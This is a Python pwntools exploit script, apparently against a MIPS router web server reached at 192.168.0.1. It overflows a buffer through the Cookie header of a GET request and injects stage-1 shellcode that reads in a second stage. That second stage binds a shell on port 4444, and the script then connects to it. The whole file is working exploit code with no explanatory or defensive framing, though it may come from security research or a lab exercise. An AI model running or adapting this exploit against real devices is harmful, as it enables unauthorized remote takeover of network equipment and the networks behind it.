from pwn import *
from time import sleep

context.binary = ELF("./v4_vuln/httpd")

url="192.168.0.1"
io = remote(url, 80)

nop = asm("addiu $a0, $a0, 0x4141") # '$\x84AA'
ra_addr = 0x7cfffa90
avoid = b'\x00\x0a\x0d' + string.ascii_lowercase.encode()

read_shell  = asm(shellcraft.findpeer(io.lport))
read_shell += asm(shellcraft.read('$s0', ra_addr, 0x200))
read_shell += asm(f"""
    lui $t9, {ra_addr >> 16}
    ori $t9, $t9, {ra_addr & 0xffff}
    jalr $t9
    addiu $a0, $a0, 0x4141
""")

payload  = b"F" * 16
payload += p32(ra_addr)
payload += nop * 100
payload += read_shell

assert all(c not in avoid for c in read_shell)

# Construct HTTP GET request with headers
request  = b"GET /loginFs/passwd HTTP/1.1\r\n"
request += b"Host: 192.168.0.1\r\n"
request += b"Referer: http://192.168.0.1/\r\n"
request += b"Cookie: "+payload+b"\r\n"
request += b"Upgrade-Insecure-Requests: 1\r\n"
request += b"\r\n"

io.send(request)
pause()

# stage 2
shell = asm(shellcraft.bindsh(4444))
io.send(shell)
io.interactive()

log.progress("connecting to shell")
sh1 = remote("192.168.0.1", 4444)
sh1.interactive()